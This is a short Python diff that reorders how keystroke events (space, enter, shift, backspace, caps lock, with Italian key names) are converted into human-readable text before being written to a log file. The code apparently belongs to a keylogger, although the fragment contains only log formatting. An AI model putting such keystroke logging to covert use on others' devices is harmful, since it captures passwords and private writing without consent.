@@ -23,10 +23,8 @@ def writeToFileRaw(lPath, lName, l):
     newLog.close()
 
 def writeToFileHuman(lPath, lName, strh):
-    if strh.find("down") != -1:
-        if strh.find("space") != -1:
-            strh = " "
-        elif strh.find("enter") != -1:
+    if strh.find("down") != -1:   
+        if strh.find("enter") != -1:
             strh = "\n"
         elif strh.find("maiusc") != -1:
             strh = ""
@@ -40,7 +38,8 @@ def writeToFileHuman(lPath, lName, strh):
             strh = " [BACKSPACE] "
         elif strh.find("bloc maius") != -1:
             strh = " [MAIUSCOLO] "
-
+        elif strh.find("space") != -1:
+            strh = " "
         else:
             strh = strh.removeprefix("KeyboardEvent(")
             strh = strh.removesuffix(" down)\n")
